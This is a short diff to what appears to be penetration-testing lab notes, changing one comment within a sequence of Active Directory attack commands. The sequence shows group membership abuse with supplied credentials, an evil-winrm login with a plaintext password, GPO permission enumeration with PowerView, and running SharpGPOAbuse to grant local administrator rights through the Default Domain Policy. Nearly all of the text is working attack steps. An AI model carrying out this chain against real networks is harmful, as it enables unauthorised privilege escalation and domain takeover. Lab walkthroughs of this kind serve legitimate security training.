@@ -443,7 +443,7 @@ Add-DomainGroupMember -Identity 'Backup Adminis' -Members Herman -Credential $cr
 evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
 *Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
 *Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
-*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | select IdentityReference    #search our user
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | select IdentityReference    #search our user to get sid
 *Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh    #Permission:GpoEditDeleteModifySecurity
 *Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
 *Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
